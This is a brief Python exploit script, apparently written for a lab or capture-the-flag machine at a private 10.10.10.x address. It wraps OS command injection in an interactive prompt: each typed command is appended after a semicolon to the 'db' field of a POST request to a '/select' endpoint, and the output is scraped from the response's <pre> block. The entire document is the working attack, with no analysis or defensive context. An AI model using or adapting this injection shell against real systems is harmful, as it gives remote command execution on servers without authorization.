from requests import post 
from re import search, DOTALL
from cmd import Cmd
from sys import exit

class Shell(Cmd):
	prompt = "> "
	def default(self, args):
		self.run_cmd(args)

	def run_cmd(self, cmd):
		if cmd.strip() == "exit":
			exit(1)
		target_url = "http://10.10.10.127/select"
		data_injection = {"db": f"test; {cmd}"}
		resp = post(target_url, data=data_injection)
		output = search(r"<pre>(.*)</pre>", resp.text, DOTALL)
		if output:
			print(output.group(1).strip('\n'))
		else:
			print("X")

if __name__ == '__main__':
	shell = Shell()
	shell.cmdloop()